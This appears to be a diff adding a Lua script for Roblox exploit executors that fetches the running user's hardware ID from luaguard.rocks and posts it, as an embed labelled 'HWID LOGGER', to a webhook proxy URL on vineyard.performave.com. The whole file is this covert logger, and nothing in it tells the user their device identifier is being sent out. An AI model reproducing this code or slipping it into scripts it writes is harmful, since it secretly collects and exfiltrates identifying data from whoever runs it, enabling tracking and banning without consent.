@@ -1,0 +1,26 @@
+httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
+
+local hwid = httprequest({
+    Url = "https://luaguard.rocks/Roblox/hwid.php",
+    Method = 'GET'
+  }).Body;
+
+    local data = {
+        ['embeds'] = {
+            {
+                ['title'] = 'HWID LOGGER',
+                --['description'] = 'description',
+                ['type'] = 'rich',
+                ['color'] = tonumber(3092790),
+                ['fields'] = {
+                    {name = 'HWID', value = hwid, inline = true},
+                }}}}
+
+    httprequest({
+        Url = 'https://vineyard.performave.com/api/webhook/v1/proxy/9c1b17c4-d4b1-45db-a1ba-a94bb0ea03c1',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode(data)
+    })
